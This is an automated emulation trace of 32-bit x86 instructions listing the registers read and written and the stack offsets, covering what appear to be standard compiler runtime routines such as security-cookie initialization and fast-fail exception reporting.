0x41bb76: mov dword ptr [ebp - 0x27c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x6c and offset 0x7d84 for stack size 0x10000 saving data to stack: 0 4 0x41bb7c: mov dword ptr [ebp - 0x280], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x6c and offset 0x7d80 for stack size 0x10000 saving data to stack: 0 4 0x41bb82: mov dword ptr [ebp - 0x284], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0x6c and offset 0x7d7c for stack size 0x10000 saving data to stack: 5175648 4 0x41bb88: mov dword ptr [ebp - 0x288], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x6c and offset 0x7d78 for stack size 0x10000 saving data to stack: 0 4 0x41bb8e: mov word ptr [ebp - 0x25c], ss, regs_read: [20, 49], regs_write: () adjusting stack for ESP -0x6c and offset 0x7da4 for stack size 0x10000 saving data to stack: 0 2 0x41bb95: mov word ptr [ebp - 0x268], cs, regs_read: [20, 11], regs_write: () adjusting stack for ESP -0x6c and offset 0x7d98 for stack size 0x10000 saving data to stack: 0 2 0x41bb9c: mov word ptr [ebp - 0x28c], ds, regs_read: [20, 17], regs_write: () adjusting stack for ESP -0x6c and offset 0x7d74 for stack size 0x10000 saving data to stack: 0 2 0x41bba3: mov word ptr [ebp - 0x290], es, regs_read: [20, 28], regs_write: () adjusting stack for ESP -0x6c and offset 0x7d70 for stack size 0x10000 saving data to stack: 0 2 0x41bbaa: mov word ptr [ebp - 0x294], fs, regs_read: [20, 32], regs_write: () adjusting stack for ESP -0x6c and offset 0x7d6c for stack size 0x10000 saving data to stack: 0 2 0x41bbb1: mov word ptr [ebp - 0x298], gs, regs_read: [20, 33], regs_write: () adjusting stack for ESP -0x6c and offset 0x7d68 for stack size 0x10000 saving data to stack: 0 2 0x41bbb9: pop dword ptr [ebp - 0x264], regs_read: [30, 20], regs_write: [30] 0x41bbbf: mov eax, dword ptr [ebp + 4], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x68 and offset 0x8004 for stack size 0x10000 0x41bbc2: mov dword ptr [ebp - 0x26c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x68 and offset 0x7d94 for stack size 0x10000 saving data to stack: 716 4 0x41bbcb: mov dword ptr [ebp - 0x260], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x68 and offset 0x7da0 for stack size 0x10000 saving data to stack: 716 4 0x41bbd1: mov dword ptr [ebp - 0x324], 0x10001, regs_read: [20], regs_write: () adjusting stack for ESP -0x68 and offset 0x7cdc for stack size 0x10000 saving data to stack: 65537 4 0x41bbdb: mov eax, dword ptr [eax - 4], regs_read: [19], regs_write: [19] 0x41bbde: push 0x50, regs_read: [30], regs_write: [30] 0x41bbe0: mov dword ptr [ebp - 0x270], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x6c and offset 0x7d90 for stack size 0x10000 saving data to stack: 716 4 0x41bbe9: push 0, regs_read: [30], regs_write: [30] 0x41bbeb: push eax, regs_read: [30, 19], regs_write: [30] 0x41bbf1: mov eax, dword ptr [ebp + 4], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x74 and offset 0x8004 for stack size 0x10000 0x41bbf7: mov dword ptr [ebp - 0x58], 0x40000015, regs_read: [20], regs_write: () adjusting stack for ESP -0x74 and offset 0x7fa8 for stack size 0x10000 saving data to stack: 1073741845 4 0x41bbfe: mov dword ptr [ebp - 0x54], 1, regs_read: [20], regs_write: () adjusting stack for ESP -0x74 and offset 0x7fac for stack size 0x10000 saving data to stack: 1 4 0x41bc05: mov dword ptr [ebp - 0x4c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x74 and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x41bc0e: push 0, regs_read: [30], regs_write: [30] 0x41bc18: mov dword ptr [ebp - 8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x78 and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 4 0x41bc23: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x78 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x41bc31: push eax, regs_read: [30, 19], regs_write: [30] 0x41bc40: push 3, regs_read: [30], regs_write: [30] 0x41bc47: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41bc48: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41bc4b: push ebp, regs_read: [30, 20], regs_write: [30] 0x41bc4c: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x7c and offset 0x8000 for stack size 0x10000 0x41bc51: push 0x44, regs_read: [30], regs_write: [30] 0x41bc56: push 0, regs_read: [30], regs_write: [30] 0x41bc58: push eax, regs_read: [30, 19], regs_write: [30] 0x41bc64: push eax, regs_read: [30, 19], regs_write: [30] 0x41bc77: push 0xa, regs_read: [30], regs_write: [30] 0x41bc79: pop eax, regs_read: [30], regs_write: [30, 19] 0x41bc81: push 0, regs_read: [30], regs_write: [30] 0x41bc8d: mov ecx, 0x5a4d, regs_read: (), regs_write: [22] 0x41bc97: mov ecx, dword ptr [eax + 0x3c], regs_read: [19], regs_write: [22] 0x41bca4: mov eax, 0x10b, regs_read: (), regs_write: [19] 0x41bcc3: push 0x41bccf, regs_read: [30], regs_write: [30] 0x41bccf: push ebp, regs_read: [30, 20], regs_write: [30] 0x41bcd0: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x98 and offset 0x8000 for stack size 0x10000 0x41bcd2: push esi, regs_read: [30, 29], regs_write: [30] 0x41bcd3: push edi, regs_read: [30, 23], regs_write: [30] 0x41bcd4: mov edi, dword ptr [ebp + 8], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xa0 and offset 0x8008 for stack size 0x10000 0x41bcd7: mov esi, dword ptr [edi], regs_read: [23], regs_write: [29] 0x41bce7: mov eax, dword ptr [esi + 0x14], regs_read: [29], regs_write: [19] 0x41bd06: pop edi, regs_read: [30], regs_write: [30, 23] 0x41bd09: pop esi, regs_read: [30], regs_write: [30, 29] 0x41bd0a: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41bd13: mov dword ptr [eax], esi, regs_read: [19, 29], regs_write: () 0x41bd15: mov esi, dword ptr [edi + 4], regs_read: [23], regs_write: [29] 0x41bd1d: mov dword ptr [eax], esi, regs_read: [19, 29], regs_write: () 0x41bd30: push 0x4373f0, regs_read: [30], regs_write: [30] 0x41bd35: push dword ptr fs:[0], regs_read: [30, 32], regs_write: [30] 0x41bd3c: mov eax, dword ptr [esp + 0x10], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x9c and offset 0x8010 for stack size 0x10000 0x41bd40: mov dword ptr [esp + 0x10], ebp, regs_read: [30, 20], regs_write: () adjusting stack for ESP -0x9c and offset 0x8010 for stack size 0x10000 saving data to stack: 0 4 0x41bd4a: push ebx, regs_read: [30, 21], regs_write: [30] 0x41bd4b: push esi, regs_read: [30, 29], regs_write: [30] 0x41bd4c: push edi, regs_read: [30, 23], regs_write: [30] 0x41bd4d: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x41bd57: push eax, regs_read: [30, 19], regs_write: [30] 0x41bd58: mov dword ptr [ebp - 0x18], esp, regs_read: [20, 30], regs_write: () adjusting stack for ESP -0xac and offset 0x7fe8 for stack size 0x10000 saving data to stack: -172 4 0x41bd5b: push dword ptr [ebp - 8], regs_read: [30, 20], regs_write: [30] 0x41bd5e: mov eax, dword ptr [ebp - 4], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xb0 and offset 0x7ffc for stack size 0x10000 0x41bd61: mov dword ptr [ebp - 4], 0xfffffffe, regs_read: [20], regs_write: () adjusting stack for ESP -0xb0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 4294967294 4 0x41bd68: mov dword ptr [ebp - 8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xb0 and offset 0x7ff8 for stack size 0x10000 saving data to stack: 0 4 0x41bd6e: mov dword ptr fs:[0], eax, regs_read: [32, 19], regs_write: () 0x41bd7a: push ebp, regs_read: [30, 20], regs_write: [30] 0x41bd7b: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0xb4 and offset 0x8000 for stack size 0x10000 0x41bd8b: push eax, regs_read: [30, 19], regs_write: [30] 0x41bd92: mov eax, dword ptr [ebp - 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xb8 and offset 0x7ff8 for stack size 0x10000 0x41bd98: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xb8 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x41bdb0: push eax, regs_read: [30, 19], regs_write: [30] 0x41bdb7: mov eax, dword ptr [ebp - 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xbc and offset 0x7ff0 for stack size 0x10000 0x41bdc7: mov ecx, dword ptr [0x4eb04c], regs_read: (), regs_write: [22] 0x41bdcd: push esi, regs_read: [30, 29], regs_write: [30] 0x41bdce: push edi, regs_read: [30, 23], regs_write: [30] 0x41bdcf: mov edi, 0xbb40e64e, regs_read: (), regs_write: [23] 0x41bdd4: mov esi, 0xffff0000, regs_read: (), regs_write: [29] 0x41bde6: mov ecx, eax, regs_read: [19], regs_write: [22] 0x41bdec: mov ecx, 0xbb40e64f, regs_read: (), regs_write: [22] 0x41be01: mov dword ptr [0x4eb04c], ecx, regs_read: [22], regs_write: () 0x41be09: pop edi, regs_read: [30], regs_write: [30, 23] 0x41be0a: mov dword ptr [0x4eb050], ecx, regs_read: [22], regs_write: () 0x41be10: pop esi, regs_read: [30], regs_write: [30, 29] 0x41be12: mov eax, 0x4000, regs_read: (), regs_write: [19] 0x41be18: push 0x4ef990, regs_read: [30], regs_write: [30] 0x41be24: push 0x30000, regs_read: [30], regs_write: [30] 0x41be29: push 0x10000, regs_read: [30], regs_write: [30] 0x41be2e: push 0, regs_read: [30], regs_write: [30] 0x41be3d: push 7, regs_read: [30], regs_write: [30] 0x41be4a: mov ecx, dword ptr [eax + 4], regs_read: [19], regs_write: [22] 0x41be50: mov dword ptr [eax + 4], ecx, regs_read: [19, 22], regs_write: () 0x41be58: mov ecx, dword ptr [eax + 4], regs_read: [19], regs_write: [22] 0x41be5e: mov dword ptr [eax + 4], ecx, regs_read: [19, 22], regs_write: () 0x41be6e: mov eax, 0x4f0bc0, regs_read: (), regs_write: [19] 0x41be74: mov eax, 0x4f0bbc, regs_read: (), regs_write: [19] 0x41be7a: push ebx, regs_read: [30, 21], regs_write: [30] 0x41be7b: push esi, regs_read: [30, 29], regs_write: [30] 0x41be7c: mov esi, 0x4e7920, regs_read: (), regs_write: [29] 0x41be81: mov ebx, 0x4e7920, regs_read: (), regs_write: [21] 0x41be8a: push edi, regs_read: [30, 23], regs_write: [30] 0x41be8b: mov edi, dword ptr [esi], regs_read: [29], regs_write: [23] 0x41be91: mov ecx, edi, regs_read: [23], regs_write: [22] 0x41bea2: pop edi, regs_read: [30], regs_write: [30, 23] 0x41bea3: pop esi, regs_read: [30], regs_write: [30, 29] 0x41bea4: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41bea6: push ebx, regs_read: [30, 21], regs_write: [30] 0x41bea7: push esi, regs_read: [30, 29], regs_write: [30] 0x41bea8: mov esi, 0x4e7928, regs_read: (), regs_write: [29] 0x41bead: mov ebx, 0x4e7928, regs_read: (), regs_write: [21] 0x41beb6: push edi, regs_read: [30, 23], regs_write: [30] 0x41beb7: mov edi, dword ptr [esi], regs_read: [29], regs_write: [23] 0x41bebd: mov ecx, edi, regs_read: [23], regs_write: [22] 0x41bece: pop edi, regs_read: [30], regs_write: [30, 23] 0x41becf: pop esi, regs_read: [30], regs_write: [30, 29] 0x41bed0: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41bed2: push ebp, regs_read: [30, 20], regs_write: [30] 0x41bed3: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0xd4 and offset 0x8000 for stack size 0x10000 0x41bed5: push 0, regs_read: [30], regs_write: [30] 0x41bedd: push dword ptr [ebp + 8], regs_read: [30, 20], regs_write: [30] 0x41bee6: push 0xc0000409, regs_read: [30], regs_write: [30] 0x41bef1: push eax, regs_read: [30, 19], regs_write: [30] 0x41bef8: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41befa: push ebp, regs_read: [30, 20], regs_write: [30] 0x41befb: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0xe4 and offset 0x8000 for stack size 0x10000 0x41bf03: push 0x17, regs_read: [30], regs_write: [30] 0x41bf0f: push 2, regs_read: [30], regs_write: [30] 0x41bf11: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41bf14: mov dword ptr [0x4efa98], eax, regs_read: [19], regs_write: () 0x41bf19: mov dword ptr [0x4efa94], ecx, regs_read: [22], regs_write: () 0x41bf1f: mov dword ptr [0x4efa90], edx, regs_read: [24], regs_write: () 0x41bf25: mov dword ptr [0x4efa8c], ebx, regs_read: [21], regs_write: () 0x41bf2b: mov dword ptr [0x4efa88], esi, regs_read: [29], regs_write: () 0x41bf31: mov dword ptr [0x4efa84], edi, regs_read: [23], regs_write: () 0x41bf37: mov word ptr [0x4efab0], ss, regs_read: [49], regs_write: () 0x41bf3e: mov word ptr [0x4efaa4], cs, regs_read: [11], regs_write: () 0x41bf45: mov word ptr [0x4efa80], ds, regs_read: [17], regs_write: () 0x41bf4c: mov word ptr [0x4efa7c], es, regs_read: [28], regs_write: () 0x41bf53: mov word ptr [0x4efa78], fs, regs_read: [32], regs_write: () 0x41bf5a: mov word ptr [0x4efa74], gs, regs_read: [33], regs_write: () 0x41bf62: pop dword ptr [0x4efaa8], regs_read: [30], regs_write: [30] 0x41bf68: mov eax, dword ptr [ebp], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xe4 and offset 0x8000 for stack size 0x10000 0x41bf6b: mov dword ptr [0x4efa9c], eax, regs_read: [19], regs_write: () 0x41bf70: mov eax, dword ptr [ebp + 4], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xe4 and offset 0x8004 for stack size 0x10000 0x41bf73: mov dword ptr [0x4efaa0], eax, regs_read: [19], regs_write: () 0x41bf7b: mov dword ptr [0x4efaac], eax, regs_read: [19], regs_write: () 0x41bf80: mov eax, dword ptr [ebp - 0x324], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xe4 and offset 0x7cdc for stack size 0x10000 0x41bf86: mov dword ptr [0x4ef9e8], 0x10001, regs_read: (), regs_write: () 0x41bf90: mov eax, dword ptr [0x4efaa0], regs_read: (), regs_write: [19] 0x41bf95: mov dword ptr [0x4ef9a4], eax, regs_read: [19], regs_write: () 0x41bf9a: mov dword ptr [0x4ef998], 0xc0000409, regs_read: (), regs_write: () 0x41bfa4: mov dword ptr [0x4ef99c], 1, regs_read: (), regs_write: () 0x41bfae: mov dword ptr [0x4ef9a8], 1, regs_read: (), regs_write: () 0x41bfb8: push 4, regs_read: [30], regs_write: [30] 0x41bfba: pop eax, regs_read: [30], regs_write: [30, 19] 0x41bfbe: mov dword ptr [eax + 0x4ef9ac], 2, regs_read: [19], regs_write: () 0x41bfc8: push 4, regs_read: [30], regs_write: [30] 0x41bfca: pop eax, regs_read: [30], regs_write: [30, 19] 0x41bfce: mov ecx, dword ptr [0x4eb04c], regs_read: (), regs_write: [22] 0x41bfd4: mov dword ptr [ebp + eax - 8], ecx, regs_read: [20, 19, 22], regs_write: () 0x41bfd8: push 4, regs_read: [30], regs_write: [30] 0x41bfda: pop eax, regs_read: [30], regs_write: [30, 19] 0x41bfde: mov ecx, dword ptr [0x4eb050], regs_read: (), regs_write: [22] 0x41bfe4: mov dword ptr [ebp + eax - 8], ecx, regs_read: [20, 19, 22], regs_write: () 0x41bfe8: push 0x4c9b14, regs_read: [30], regs_write: [30] 0x41bff4: push ebp, regs_read: [30, 20], regs_write: [30] 0x41bff5: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0xec and offset 0x8000 for stack size 0x10000 0x41bff7: push 8, regs_read: [30], regs_write: [30] 0x41bffe: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41c000: push ebp, regs_read: [30, 20], regs_write: [30] 0x41c001: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0xf0 and offset 0x8000 for stack size 0x10000 0x41c009: push 0x17, regs_read: [30], regs_write: [30] 0x41c015: mov ecx, dword ptr [ebp + 8], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xf4 and offset 0x8008 for stack size 0x10000 0x41c01a: mov dword ptr [0x4efa98], eax, regs_read: [19], regs_write: () 0x41c01f: mov dword ptr [0x4efa94], ecx, regs_read: [22], regs_write: () 0x41c025: mov dword ptr [0x4efa90], edx, regs_read: [24], regs_write: () 0x41c02b: mov dword ptr [0x4efa8c], ebx, regs_read: [21], regs_write: () 0x41c031: mov dword ptr [0x4efa88], esi, regs_read: [29], regs_write: () 0x41c037: mov dword ptr [0x4efa84], edi, regs_read: [23], regs_write: () 0x41c03d: mov word ptr [0x4efab0], ss, regs_read: [49], regs_write: () 0x41c044: mov word ptr [0x4efaa4], cs, regs_read: [11], regs_write: () 0x41c04b: mov word ptr [0x4efa80], ds, regs_read: [17], regs_write: () 0x41c052: mov word ptr [0x4efa7c], es, regs_read: [28], regs_write: () 0x41c059: mov word ptr [0x4efa78], fs, regs_read: [32], regs_write: () 0x41c060: mov word ptr [0x4efa74], gs, regs_read: [33], regs_write: () 0x41c068: pop dword ptr [0x4efaa8], regs_read: [30], regs_write: [30] 0x41c06e: mov eax, dword ptr [ebp], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xf0 and offset 0x8000 for stack size 0x10000 0x41c071: mov dword ptr [0x4efa9c], eax, regs_read: [19], regs_write: () 0x41c076: mov eax, dword ptr [ebp + 4], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xf0 and offset 0x8004 for stack size 0x10000 0x41c079: mov dword ptr [0x4efaa0], eax, regs_read: [19], regs_write: () 0x41c081: mov dword ptr [0x4efaac], eax, regs_read: [19], regs_write: () 0x41c086: mov eax, dword ptr [ebp - 0x31c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xf0 and offset 0x7ce4 for stack size 0x10000 0x41c08c: mov eax, dword ptr [0x4efaa0], regs_read: (), regs_write: [19] 0x41c091: mov dword ptr [0x4ef9a4], eax, regs_read: [19], regs_write: () 0x41c096: mov dword ptr [0x4ef998], 0xc0000409, regs_read: (), regs_write: () 0x41c0a0: mov dword ptr [0x4ef99c], 1, regs_read: (), regs_write: () 0x41c0aa: mov dword ptr [0x4ef9a8], 1, regs_read: (), regs_write: () 0x41c0b4: push 4, regs_read: [30], regs_write: [30] 0x41c0b6: pop eax, regs_read: [30], regs_write: [30, 19] 0x41c0ba: mov ecx, dword ptr [ebp + 8], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xf0 and offset 0x8008 for stack size 0x10000 0x41c0bd: mov dword ptr [eax + 0x4ef9ac], ecx, regs_read: [19, 22], regs_write: () 0x41c0c3: push 0x4c9b14, regs_read: [30], regs_write: [30] 0x41c0d0: push ecx, regs_read: [30, 22], regs_write: [30] 0x41c0dd: mov eax, esp, regs_read: [30], regs_write: [19] adjusting stack for ESP -0xf8 and offset 0x8000 for stack size 0x10000 0x41c0e8: mov eax, ecx, regs_read: [22], regs_write: [19] 0x41c0ea: pop ecx, regs_read: [30], regs_write: [30, 22] 0x41c0ec: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x41c0ee: mov dword ptr [esp], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xf4 and offset 0x8000 for stack size 0x10000 saving data to stack: 0 4 0x41c100: push edi, regs_read: [30, 23], regs_write: [30] 0x41c101: mov ecx, 1, regs_read: (), regs_write: [22] 0x41c106: mov edi, 0x4efcd4, regs_read: (), regs_write: [23] 0x41c116: push esi, regs_read: [30, 29], regs_write: [30] 0x41c117: mov esi, dword ptr [0x4c805c], regs_read: (), regs_write: [29] 0x41c120: push 0, regs_read: [30], regs_write: [30] 0x41c124: mov ecx, 1, regs_read: (), regs_write: [22] 0x41c134: pop esi, regs_read: [30], regs_write: [30, 29] 0x41c142: pop edi, regs_read: [30], regs_write: [30, 23] 0x41c146: pop edi, regs_read: [30], regs_write: [30, 23] 0x41c148: push 0x4efcbc, regs_read: [30], regs_write: [30] 0x41c153: mov eax, 2, regs_read: (), regs_write: [19] 0x41c15d: pop edi, regs_read: [30], regs_write: [30, 23] 0x41c17d: push 0x4efcbc, regs_read: [30], regs_write: [30] 0x41c188: mov dword ptr [0x4efcb8], 1, regs_read: (), regs_write: () 0x41c1ae: mov dword ptr [eax], 1, regs_read: [19], regs_write: () 0x41c1b8: push 0x4efcbc, regs_read: [30], regs_write: [30] 0x41c1bd: mov dword ptr [0x4efcb8], 0, regs_read: (), regs_write: () 0x41c1ea: mov eax, 1, regs_read: (), regs_write: [19] 0x41c21d: mov dword ptr [0x4efcb4], 1, regs_read: (), regs_write: () 0x41c24e: mov eax, dword ptr [0x4efcd8], regs_read: (), regs_write: [19] 0x41c260: push ebx, regs_read: [30, 21], regs_write: [30] 0x41c261: mov ebx, esp, regs_read: [30], regs_write: [21] adjusting stack for ESP -0x100 and offset 0x8000 for stack size 0x10000 0x41c26c: push ebp, regs_read: [30, 20], regs_write: [30] 0x41c26d: mov ebp, dword ptr [ebx + 4], regs_read: [21], regs_write: [20] 0x41c270: mov dword ptr [esp + 4], ebp, regs_read: [30, 20], regs_write: () adjusting stack for ESP -0x104 and offset 0x8004 for stack size 0x10000 saving data to stack: 0 4 0x41c274: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x104 and offset 0x8000 for stack size 0x10000 0x41c27c: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x41c283: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x104 and offset 0x7ffc for stack size 0x10000 saving data to stack: 1 4 0x41c286: push esi, regs_read: [30, 29], regs_write: [30] 0x41c287: push edi, regs_read: [30, 23], regs_write: [30] 0x41c288: mov ecx, dword ptr [ebx + 0x10], regs_read: [21], regs_write: [22] 0x41c28b: mov edx, dword ptr [ebx + 0x24], regs_read: [21], regs_write: [24] 0x41c28e: mov eax, dword ptr [ebx + 0x18], regs_read: [21], regs_write: [19] 0x41c291: movaps xmm2, xmmword ptr [0x4c9b30], regs_read: (), regs_write: [124] 0x41c298: mov dword ptr [ebp - 0x198], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x10c and offset 0x7e68 for stack size 0x10000 saving data to stack: 1 4 0x41c29e: mov ecx, dword ptr [ebx + 0x14], regs_read: [21], regs_write: [22] 0x41c2a1: mov esi, dword ptr [ebx + 8], regs_read: [21], regs_write: [29] 0x41c2a4: mov dword ptr [ebp - 0x16c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x10c and offset 0x7e94 for stack size 0x10000 saving data to stack: 1 4 0x41c2aa: mov ecx, dword ptr [ebx + 0x20], regs_read: [21], regs_write: [22] 0x41c2ad: mov dword ptr [ebp - 0x170], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x10c and offset 0x7e90 for stack size 0x10000 saving data to stack: 0 4 0x41c2b3: mov edx, dword ptr [ebx + 0x28], regs_read: [21], regs_write: [24] 0x41c2b6: mov dword ptr [ebp - 0x12c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x10c and offset 0x7ed4 for stack size 0x10000 saving data to stack: 1 4 0x41c2bc: mov dword ptr [ebp - 0x128], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x10c and offset 0x7ed8 for stack size 0x10000 saving data to stack: 1 4 0x41c2c2: mov dword ptr [ebp - 0x194], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x10c and offset 0x7e6c for stack size 0x10000 saving data to stack: 0 4 0x41c2c8: mov edi, dword ptr [ebx + 0xc], regs_read: [21], regs_write: [23] 0x41c2cb: mov dword ptr [ebp - 0x130], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x10c and offset 0x7ed0 for stack size 0x10000 saving data to stack: 5176532 4 0x41c2d5: mov edx, dword ptr [ebp - 0x170], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x10c and offset 0x7e90 for stack size 0x10000 0x41c2e2: push edx, regs_read: [30, 24], regs_write: [30] 0x41c2e3: push ecx, regs_read: [30, 22], regs_write: [30] 0x41c2e4: push edi, regs_read: [30, 23], regs_write: [30] 0x41c2e5: push esi, regs_read: [30, 29], regs_write: [30] 0x41c2eb: mov eax, dword ptr [ebp - 0x170], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x11c and offset 0x7e90 for stack size 0x10000 0x41c2f4: mov ecx, eax, regs_read: [19], regs_write: [22] 0x41c306: push ecx, regs_read: [30, 22], regs_write: [30] 0x41c307: push eax, regs_read: [30, 19], regs_write: [30] 0x41c30b: movaps xmmword ptr [ebp - 0x20], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x124 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 16 0x41c30f: push eax, regs_read: [30, 19], regs_write: [30] 0x41c315: push 0x10, regs_read: [30], regs_write: [30] 0x41c31a: push eax, regs_read: [30, 19], regs_write: [30] 0x41c31b: push edi, regs_read: [30, 23], regs_write: [30] 0x41c31c: push esi, regs_read: [30, 29], regs_write: [30] 0x41c325: mov eax, dword ptr [ebp - 0x12c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ed4 for stack size 0x10000 0x41c32b: movaps xmm2, xmmword ptr [0x4c9b30], regs_read: (), regs_write: [124] 0x41c332: mov ecx, dword ptr [ebp - 0x194], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x138 and offset 0x7e6c for stack size 0x10000 0x41c341: movaps xmm5, xmmword ptr [0x4c8bb0], regs_read: (), regs_write: [127] 0x41c348: mov dword ptr [ebp - 0x138], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ec8 for stack size 0x10000 saving data to stack: 0 4 0x41c356: movaps xmmword ptr [ebp - 0x190], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e70 for stack size 0x10000 saving data to stack: 0 16 0x41c363: mov edi, dword ptr [ebp - 0x16c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x138 and offset 0x7e94 for stack size 0x10000 0x41c369: mov ecx, dword ptr [ebp - 0x12c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x138 and offset 0x7ed4 for stack size 0x10000 0x41c36f: mov dword ptr [ebp - 0x154], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x138 and offset 0x7eac for stack size 0x10000 saving data to stack: 1 4 0x41c37b: mov dword ptr [ebp - 0x13c], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ec4 for stack size 0x10000 saving data to stack: 1 4 0x41c381: mov dword ptr [ebp - 0x124], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x138 and offset 0x7edc for stack size 0x10000 saving data to stack: 0 4 0x41c38a: mov dword ptr [ebp - 0x150], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x138 and offset 0x7eb0 for stack size 0x10000 saving data to stack: 1 4 0x41c390: mov edi, dword ptr [ebp - 0x124], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x138 and offset 0x7edc for stack size 0x10000 0x41c399: mov dword ptr [ebp - 0x134], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ecc for stack size 0x10000 saving data to stack: 0 4 0x41c39f: mov dword ptr [ebp - 0x148], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x138 and offset 0x7eb8 for stack size 0x10000 saving data to stack: 0 4 0x41c3a5: mov eax, dword ptr [ebp - 0x12c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ed4 for stack size 0x10000 0x41c3ab: mov dword ptr [ebp - 0x168], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e98 for stack size 0x10000 saving data to stack: 0 4 0x41c3b1: mov dword ptr [ebp - 0x144], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ebc for stack size 0x10000 saving data to stack: 0 4 0x41c3b7: mov dword ptr [ebp - 0x14c], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x138 and offset 0x7eb4 for stack size 0x10000 saving data to stack: 0 4 0x41c3c0: mov dword ptr [ebp - 0x128], 0xe0, regs_read: [20], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ed8 for stack size 0x10000 saving data to stack: 224 4 0x41c3cd: mov dword ptr [ebp - 0x15c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ea4 for stack size 0x10000 saving data to stack: 0 4 0x41c3d3: mov dword ptr [ebp - 0x164], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e9c for stack size 0x10000 saving data to stack: 0 4 0x41c3d9: mov ecx, dword ptr [ebp - 0x168], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x138 and offset 0x7e98 for stack size 0x10000 0x41c3df: mov dword ptr [ebp - 0x140], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 4 0x41c3e5: mov dword ptr [ebp - 0x174], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e8c for stack size 0x10000 saving data to stack: 0 4 